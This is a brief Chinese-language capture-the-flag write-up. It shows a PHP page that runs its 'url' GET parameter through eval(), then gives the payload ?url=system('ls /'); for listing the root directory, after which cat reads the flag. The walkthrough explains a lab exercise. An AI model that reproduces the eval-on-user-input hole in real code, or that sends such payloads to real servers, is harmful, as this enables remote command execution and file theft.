源码

```
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['url']))
{
eval($_GET['url']);
}
?>
```

有eval 但是是get传参 将传入的内容作为php代码执行 利用php可以执行Linux命令

用下列payload查看根目录

```
?url=system('ls /');
```

![](https://s2.loli.net/2022/05/15/OukxLdMYW93ZaoQ.png)

发现在根目录下  直接cat指令读取文件  拿到flag

